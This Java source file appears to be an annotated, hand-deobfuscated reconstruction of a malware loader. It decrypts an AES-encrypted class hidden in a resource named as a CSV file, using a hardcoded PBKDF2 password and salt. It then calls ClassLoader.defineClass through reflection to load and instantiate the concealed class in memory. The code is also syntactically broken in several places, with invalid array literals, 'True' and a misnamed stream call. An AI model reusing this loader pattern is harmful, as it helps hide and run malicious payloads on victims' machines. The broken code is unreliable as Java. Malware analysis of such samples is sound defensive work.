import java.io.DataInputStream;
import java.io.InputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.security.Key;
import java.security.ProtectionDomain;
import java.security.SecureClassLoader;
import java.security.spec.KeySpec;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;


public class Poleyn {
	public static byte[] byteArray;
	public static SecretKeySpec secretKeySpecification;
	public static Cipher cipherInstance;
	public static Method cipherInit;
	public static Method defClass;

	public static void main(final String[] array) throws Exception {
		byteArray = new byte[4784];
		readResource();
		secretKeySetup();
		cipherSetup();
		initializeCrypto();
		uncoverMethod();
		Class hiddenClass = getHiddenClass();
		hiddenClass.newInstance();
	}

	public static void readResource() throws IOException {
		Class dummyClass = Leptodactylus.class;//see reference below
		URL resourceLocation = dummyClass.getResource("/club/crop/dig/lady/bone/nor/net/here/Chionis.csv");
		InputStream resourceStream = resourceLocation.openStream();
		Misremembrance.rsrcData = new DataInputStream(resourceStream());
		Misremembrance.rsrcData.readFully(byteArray);
	}

	public static void secretKeySetup() {
		char[] password = ['b', 'Y', '6', 'b', 'V', 'E', 'N', '3', 'V', 'j', 'c', 'P', 'd', 'j', 'E', 'i'];
		byte[] salt = [98, 107, 90, 112, 116, 66, 99, 108, 67, 103, 78, 117, 111, 121, 81, 113];
		PBEKeySpec pbeSpecification = new PBEKeySpec(password, salt, 10000, 128);//PBE means password-based encryption
		SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
		SecretKey key = keyFactory.generateSecret(pbeSpecification);
		byte[] keyBytes = key.getEncoded();
		secretKeySpecification = new SecretKeySpec(keyBytes, "AES");
	}

	public void cipherSetup() throws NoSuchMethodException {
		cipherInstance = Cipher.getInstance("AES/ECB/PKCS5Padding");
		Class cipherClass = cipherInstance.getClass();
		Class[] holder = new Class[] { Integer.TYPE, Key.class };//Integer.TYPE is... almost and Integer it's weird
		cipherInit = cipherClass.getDeclaredMethod("init", (Class[])holder);
	}

	public static void initializeCrypto() throws IllegalAccessException, InvocationTargetException {
		Integer integerObj = 2;//also an Object
		Object secretKeyObj = secretKeySpecification;
		Object[] objArray = new Object[] { integerObj, secretKeyObj };
		Object lethargical = cipherInit.invoke(cipherInstance, objArray);//lethargical never called... nothing SHOULD be returned but may be some Class trickery I missed, !!!debug
	}

	public void uncoverMethod() throws NoSuchMethodException {
		Class[] classArray = new Class[] { String.class, byte[].class, Integer.TYPE, Integer.TYPE, ProtectionDomain.class };//why is this needed?
		Class cLoadInstance = ClassLoader.class;
		defClass = cLoadInstance.getDeclaredMethod("defineClass", (Class[])classArray);
		defClass.setAccessible(True);//only time any bool ever actually used
	}

	public static Object getHiddenClass() throws IllegalAccessException, InvocationTargetException {
		Misremembrance.selfRef = Misremembrance.class;//freaky self-recursion (sorta), see reference below
		ClassLoader loader = new SecureClassLoader(Misremembrance.selfRef.getClassLoader()) {};
		Object[] arguments = new Object[] { "q0b4.bootstrap.templates.Header", cipherInstance.doFinal(byteArray), 0, 4772, Misremembrance.selfRef.getProtectionDomain };//name, class data, offset, length, Protection Domain
		return defClass.invoke(loader, arguments);
	}
}
public class Leptodactylus {
	public static String ostial;public static String splasher;public static String altimetrical;public static String isocyanine;public static String cowichan;
}
public class Misremembrance {
	public static Class selfRef;
	public static DataInputStream rsrcData;
	public static String undistinct;public static String approvable;
	
	static {
		Misremembrance.selfRef = Misremembrance.class;
	}
}
